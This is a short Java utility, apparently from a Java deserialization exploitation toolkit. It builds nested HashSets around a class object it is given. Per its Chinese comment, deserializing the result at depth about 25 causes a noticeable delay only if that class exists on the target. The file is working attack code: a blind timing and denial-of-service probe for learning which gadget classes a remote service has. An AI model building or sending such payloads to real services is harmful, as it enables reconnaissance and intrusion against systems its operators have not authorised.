package util;

import java.util.HashSet;
import java.util.Set;

public class ProbeUtils {
    //若目标类存在，深度一般在25会有明显延时的效果。若目标类不存在则没有延时
    public static Object probeClassByBomb  ( final String className,final int depth ) throws Exception {

        Class findClazz = GadgetUtils.makeClass(className);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }
}
